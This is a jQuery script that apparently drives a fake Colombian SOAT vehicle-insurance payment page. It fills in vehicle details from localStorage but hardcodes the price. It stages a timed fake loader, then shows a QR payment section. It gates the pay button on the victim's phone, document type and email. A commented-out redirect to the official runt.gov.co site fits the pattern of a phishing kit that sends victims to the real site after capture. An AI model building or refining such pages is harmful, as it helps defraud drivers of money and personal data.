$(document).ready(function () {
  const cache1 = localStorage.getItem("placa");
  const cache3 = localStorage.getItem("marca");
  const cache4 = localStorage.getItem("linea");
  const cache13 = localStorage.getItem("modelo");
  const cache5 = "PARTICULAR";

  let cache6 = "";
  let cache9 = "";

  if (/\d{3}$/.test(cache1)) {
    cache6 = "VEHÍCULO";
    cache9 = "6";
  } else {
    cache6 = "MOTOCICLETA";
    cache9 = "2";
  }

  const cache7 = localStorage.getItem("cilindraje");
  const cache12 = localStorage.getItem("valor");
  const numero = parseInt(cache12, 10);
  const numeroFormateado = new Intl.NumberFormat("es-CO").format(numero);

  //  const cache12Formateado = "Pene gordo";

  $("#clasePago").text(cache6);
  $("#tipoSPago").text(cache5);
  $("#modeloPago").text(cache13);
  $("#ccPago").text(cache7);
  $("#pasajerosPago").text(cache9);
  $("#placaPago").text(cache1);
  $("#valorPago").text(numeroFormateado);
  $("#valorPago2").text(numeroFormateado);
  $("#valorPago3").text(numeroFormateado);
  $("#valorPago4").text(numeroFormateado);

  let cacheParseado = cache12;
  cacheParseado = parseFloat("308,500".replace(",", ""));

  let prima = cacheParseado - 106900;
  let primaFormateada = prima.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");

  $("#primaPago").text(primaFormateada);

  $("#btnPagarStep33").on("click", function () {
    $("#loader").addClass("displayBlock");

    setTimeout(function () {
      $("#loader").removeClass("displayBlock");
      $("#apartadoQr").removeClass("displayNone");
      $("#apartadoPredeterminado").addClass("displayNone");
      $(".activomanito0").addClass("displayNone");
      $(".tituloarribabancoslo").removeClass("displayNone");
    }, 3000);
  });

  // $("#btnPagarStep44").on("click", function () {
  //   $("#loader").addClass("displayBlock");

  //   setTimeout(function () {
  //     window.location.href =
  //       "https://www.runt.gov.co/consultaCiudadana/#/consultaVehiculo";
  //   }, 7000);
  // });

  // $("#btnBackAparPago").on("click", function () {
  //   window.location.href = "../seguro-obligatorio/";
  // });

  $("#btnPagarStep44").on("click", function () {
    $("#loader").addClass("displayBlock");
  });

  function validarInputs() {
    const valorInput2 = $("#typeDocument").val();
    const valorInput3 = $("#telephone").val().trim();
    const valorInput4 = $("#numeroDni").val().trim();

    const cumpleInput2 = valorInput2 !== "0";
    const cumpleInput3 = valorInput3.length >= 7;
    const cumpleInput4 = valorInput4.includes('@') && valorInput4.includes('.') && valorInput4.length >= 13;

    if (cumpleInput2 && cumpleInput3 && cumpleInput4) {
      $("#btnPagarStep44").prop("disabled", false);
    } else {
      $("#btnPagarStep44").prop("disabled", true);
    }
  }

  validarInputs();

  $("#typeDocument, #telephone, #numeroDni").on("input", function () {
    validarInputs();
  });

  $("#btnBackAparPago").on("click", function () {
    window.location.href = "../seguro-obligatorio/";
  });
});
